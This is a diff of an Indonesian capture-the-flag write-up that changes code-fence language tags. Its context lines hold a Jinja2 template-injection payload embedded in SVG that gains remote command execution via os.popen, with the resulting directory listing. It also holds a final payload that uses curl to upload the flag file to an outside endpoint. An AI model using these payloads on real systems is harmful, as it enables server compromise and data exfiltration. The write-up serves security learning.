@@ -1346,7 +1346,7 @@ image 4
 
 Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os module python yaitu `os.popen()` untuk mendapatkan RCE.
 
-```py
+```html
 <svg>
     <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}{%endraw%}</image>
 </svg>
@@ -1354,7 +1354,7 @@ Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os modul
 
 Sebelumnya menggunakan `[]` dll, tetapi gagal `(Internal Server Error)`. Dan mencari-cari payload diinternet, didapatkan menggunakan `config` dan berhasil.
 
-```html
+```sh
 ..[snip]..image total 84
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 .
 drwxr-xr-x   1 root root 4096 Aug 28 02:18 ..
@@ -1388,7 +1388,7 @@ Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`.
 
 Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payloadnya.
 
-```py
+```html
 <svg>
     <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('curl [URL_ENDPOINT] --upload-file /loooool_ini_lho_fl4gnya').read() }}{%endraw%}</image>
 </svg>
